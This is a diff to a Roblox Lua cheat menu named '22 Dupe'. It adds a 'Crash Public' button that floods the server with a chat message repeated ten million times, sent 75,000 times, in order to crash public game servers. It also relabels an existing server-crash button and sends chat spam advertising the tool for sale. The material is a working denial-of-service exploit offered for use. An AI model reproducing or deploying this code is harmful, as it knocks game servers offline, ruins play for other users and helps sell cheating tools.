@@ -12,6 +12,7 @@ local AutoDropStop = Instance.new("TextButton")
 local AutoDropStart = Instance.new("TextButton")
 local SafeTeleport = Instance.new("TextButton")
 local AntiAfk = Instance.new("TextButton")
+local Crash = Instance.new("TextButton")
 local Credit = Instance.new("TextButton")
 local Dupe = Instance.new("TextBox")
 local TextBox_Roundify_12px = Instance.new("ImageLabel")
@@ -36,9 +37,9 @@ CrashServer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 CrashServer.BorderColor3 = Color3.fromRGB(127, 0, 190)
 CrashServer.BorderSizePixel = 2
 CrashServer.Position = UDim2.new(0.0677290186, 0, 0.47268942, 0)
-CrashServer.Size = UDim2.new(0, 86, 0, 50)
+CrashServer.Size = UDim2.new(0, 95, 0, 50)
 CrashServer.Font = Enum.Font.PermanentMarker
-CrashServer.Text = "Crash Server"
+CrashServer.Text = "Crash VIP Server"
 CrashServer.TextColor3 = Color3.fromRGB(255, 255, 255)
 CrashServer.TextSize = 14.000
 CrashServer.MouseButton1Down:connect(function()
@@ -59,7 +60,7 @@ local natass = "/"
     	notifSound.SoundId = "rbxassetid://1837974324"
     	notifSound.PlayOnRemove = true
     	notifSound:Destroy()
-      game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Click Crash Server Once Again :D", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Okay"})
+      game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Crashing..", Icon = "rbxassetid://505845268", Duration = 30, Button1 = "Okay"})
 
       wait(0) local A_1 = "dm kristina#llll to Buy!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 end)
@@ -119,29 +120,64 @@ AutoDropStart.MouseButton1Click:connect(function()
 end)
 
 
-SafeTeleport.Name = "SafeTeleport"
-SafeTeleport.Parent = Frame
-SafeTeleport.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-SafeTeleport.BorderColor3 = Color3.fromRGB(121, 0, 182)
-SafeTeleport.Position = UDim2.new(0.727192104, 0, 0.715380132, 0)
-SafeTeleport.Size = UDim2.new(0, 81, 0, 21)
-SafeTeleport.Font = Enum.Font.PermanentMarker
-SafeTeleport.Text = "Safe Teleport"
-SafeTeleport.TextColor3 = Color3.fromRGB(255, 255, 255)
-SafeTeleport.TextSize = 14.000
-SafeTeleport.MouseButton1Down:connect(function()
-game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-118, -87, 150))
-local notifSound = Instance.new("Sound",workspace)
-	notifSound.PlaybackSpeed = 1
-	notifSound.Volume = 0.5
-	notifSound.SoundId = "rbxassetid://170765130"
-	notifSound.PlayOnRemove = true
-	notifSound:Destroy()
-game.StarterGui:SetCore("SendNotification", {
-		Title = "22 Dupe";
-		Text = "Teleported to Secret Place."
-	})
-end)
+  Crash.Name = "Crash"
+  Crash.Parent = Frame
+  Crash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  Crash.BorderColor3 = Color3.fromRGB(121, 0, 182)
+  Crash.Position = UDim2.new(0.727192104, 0, 0.145436764, 0)
+  Crash.Size = UDim2.new(0, 81, 0, 21)
+  Crash.Font = Enum.Font.PermanentMarker
+  Crash.Text = "Crash Public"
+  Crash.TextColor3 = Color3.fromRGB(255, 255, 255)
+  Crash.TextSize = 14.000
+  Crash.MouseButton1Down:connect(function()
+  wait(0) local A_1 = "Crashing the Server with 22 Dupe.." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+
+local natass = "/"
+
+    local Message = (natass.. "clean".." "):rep(10000000)
+
+    for i = 1, 75000 do
+        game.Players:Chat(Message)
+    end
+
+    local notifSound = Instance.new("Sound",workspace)
+    	notifSound.PlaybackSpeed = 1
+    	notifSound.Volume = 0.5
+    	notifSound.SoundId = "rbxassetid://1837974324"
+    	notifSound.PlayOnRemove = true
+    	notifSound:Destroy()
+      game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Crashing...", Icon = "rbxassetid://505845268", Duration = 30, Button1 = "Okay"})
+
+      wait(0) local A_1 = "dm kristina#llll to Buy!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+  end)
+
+
+  
+    SafeTeleport.Name = "SafeTeleport"
+    SafeTeleport.Parent = Frame
+    SafeTeleport.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    SafeTeleport.BorderColor3 = Color3.fromRGB(121, 0, 182)
+    SafeTeleport.Position = UDim2.new(0.727192104, 0, 0.715380132, 0)
+    SafeTeleport.Size = UDim2.new(0, 81, 0, 21)
+    SafeTeleport.Font = Enum.Font.PermanentMarker
+    SafeTeleport.Text = "Safe Teleport"
+    SafeTeleport.TextColor3 = Color3.fromRGB(255, 255, 255)
+    SafeTeleport.TextSize = 14.000
+    SafeTeleport.MouseButton1Down:connect(function()
+    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-118, -87, 150))
+    local notifSound = Instance.new("Sound",workspace)
+    	notifSound.PlaybackSpeed = 1
+    	notifSound.Volume = 0.5
+    	notifSound.SoundId = "rbxassetid://170765130"
+    	notifSound.PlayOnRemove = true
+    	notifSound:Destroy()
+    game.StarterGui:SetCore("SendNotification", {
+    		Title = "22 Dupe";
+    		Text = "Teleported to Secret Place."
+    	})
+    end)
+
 
 AntiAfk.Name = "AntiAfk"
 AntiAfk.Parent = Frame
